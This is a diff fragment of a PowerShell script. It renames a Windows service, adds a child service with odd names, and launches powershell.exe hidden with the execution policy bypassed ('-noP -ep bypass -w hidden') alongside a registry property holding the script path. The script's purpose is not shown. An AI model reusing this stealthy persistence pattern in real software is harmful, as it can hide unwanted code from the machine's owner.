@@ -38,9 +38,11 @@ if($item){
     New-ItemProperty -Path "$basePath" -Name $propertyName -Value $scriptPath -Force
 }
 
-$serviceName = "MyRootmonmonService"
+$serviceName = "Exsanguinate"
+$childServiceName = "Lugubrious"
+$childServicePropertyName = "rootMon"
 $exepath = "powershell.exe"
-$arguments = "-noP -ep bypass -w hidden $scriptPath -rootPath '$rootPath' -basePath '$basePath'"
+$arguments = "-noP -ep bypass -w hidden $scriptPath -rootPath '$rootPath' -basePath '$basePath' -childServiceName $childServiceName -childServicePropertyName $childServicePropertyName"
 # $downloadPath = "$env:temp\nssm.zip"
 
 if(-not(Test-Path -Path $nssmFolder -PathType Container)){
